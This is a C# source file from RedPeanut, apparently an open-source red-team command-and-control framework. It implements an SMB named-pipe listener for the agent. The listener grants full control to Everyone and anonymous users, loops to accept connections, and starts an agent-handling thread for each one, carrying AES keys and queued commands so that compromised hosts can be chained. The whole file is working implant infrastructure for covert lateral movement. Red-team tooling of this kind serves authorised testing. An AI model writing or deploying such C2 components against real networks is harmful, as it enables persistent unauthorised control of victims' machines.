//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using RedPeanutAgent.Core;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;

namespace RedPeanutAgent.C2
{
    class SmbListener
    {
        private static List<Thread> listt = new List<Thread>();
        private static Dictionary<string, AgentInstanceNamedPipe> instances = new Dictionary<string, AgentInstanceNamedPipe>();
        private string pipename = "";
        private string serverkey;
        private static Random random = new Random();
        private bool IsStarted = false;
        private Dictionary<string, List<Utility.TaskMsg>> commands = null;
        private byte[] aeskey;
        private byte[] aesiv;
        private string AgentPivoter = "";

        public SmbListener(string pipename, string serverkey, byte[] aeskey, byte[] aesiv, string agentpivoter, Dictionary<string, List<Utility.TaskMsg>> commands)
        {
            this.pipename = pipename;
            this.serverkey = serverkey;
            this.aesiv = aesiv;
            this.aeskey = aeskey;
            this.commands = commands;
            AgentPivoter = agentpivoter;
        }

        public bool GetIsStarted()
        {
            return IsStarted;
        }

        // Server main thread
        public void Execute()
        {

            IsStarted = true;
            Console.WriteLine("\n[*] RedPeanut Smb server started");
            Console.WriteLine("[*] Server Key {0}", serverkey);
            Console.WriteLine("[*] Waiting for client connection...");
            do
            {
                PipeSecurity ps = new PipeSecurity();
                ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.AnonymousSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.NetworkServiceSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                //ps.AddAccessRule(new PipeAccessRule(WindowsIdentity.GetCurrent().User, PipeAccessRights.FullControl, AccessControlType.Allow));
                ps.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));

                NamedPipeServerStream pipe = new NamedPipeServerStream(pipename, PipeDirection.InOut,
                    NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message, PipeOptions.Asynchronous, 4098, 4098, ps);

                pipe.WaitForConnection();

                AgentInstanceNamedPipe agentinstance = new AgentInstanceNamedPipe(pipe, AgentPivoter, serverkey, commands);
                Thread t = new Thread(new ThreadStart(agentinstance.Run));
                t.Start();
                listt.Add(t);

            } while (true);
        }
    }
}
